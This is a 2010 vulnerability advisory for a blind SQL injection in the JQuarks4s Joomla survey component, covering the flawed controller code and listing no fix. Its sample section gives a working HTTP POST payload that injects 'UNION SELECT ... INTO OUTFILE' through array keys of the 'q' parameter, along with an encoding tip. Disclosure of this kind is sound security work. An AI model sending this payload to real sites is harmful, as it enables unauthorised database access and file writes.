@@ -1,0 +1,111 @@
+JQuarks4s Joomla Component 1.0.0 Blind SQL Injection Vulnerability
+
+ Name              JQuarks4s
+ Vendor            http://www.iptechinside.com/labs/projects/list_files/jquarks-for-surveys
+ Versions Affected 1.0.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-11-08
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+A Joomla 1.5 free and open source tool for online surveys
+and statistical analysis.
+
+
+II. DESCRIPTION
+_______________
+
+A parameter is not properly sanitised before  being  used
+in a SQL query.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Blind SQL Injection
+ 
+
+A) Blind SQL Injection
+_______________________
+
+Input  passed  to  the  "q"   parameter  in when "option"
+is set to "com_jquarks4s" and "task" to "submitSurvey" is
+not properly verified before  being  used in a SQL query.
+This  can  be  exploited to  manipulate  SQL  queries  by
+injecting arbitrary SQL code.
+
+The following is the vulnerable code (controller.php):
+
+
+function submitSurvey()
+{
+  // get post data
+  $data = JRequest::get('post');
+
+...
+
+$questions = $data['q'];
+// debug
+//var_dump($data);exit;
+foreach ($questions as $question_id => $question) :
+
+  $type_id = (int)$question['type_id'];
+
+  switch ($type_id) :
+
+...
+
+  case 4:
+    // recuperer les row_id du question_id
+    $rowsDB = $sessionModel->getRows($question_id);
+
+
+So,  $question_id  is  a key of the array "q" and type_id
+his value. Therefore  the  injection   is   possibile  by
+inserting  arbitrary SQL code as the key of the array and
+4 as his value.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Blind SQL Injection
+
+Try  to  send the following packet to your  test  server.
+Ensure that  magic_quotes_gpc  is  set to off in order to
+use the following test.
+
+
+POST /path/index.php HTTP/1.1
+Host: target
+Content-Type: application x-www-form-urlencoded
+Content-Length: 97
+
+option=com_jquarks4s&task=submitSurvey&q[-1 UNION SELECT 0x414141 INTO OUTFILE '/tmp/trycopy' ]=4
+
+
+Note that if you want to use the '=' character, you  must
+covert it in URL encode format (%3D), otherwise the value
+4 needed for the injection cannot be read.
+
+
+V. FIX
+______
+
+No fix.
+
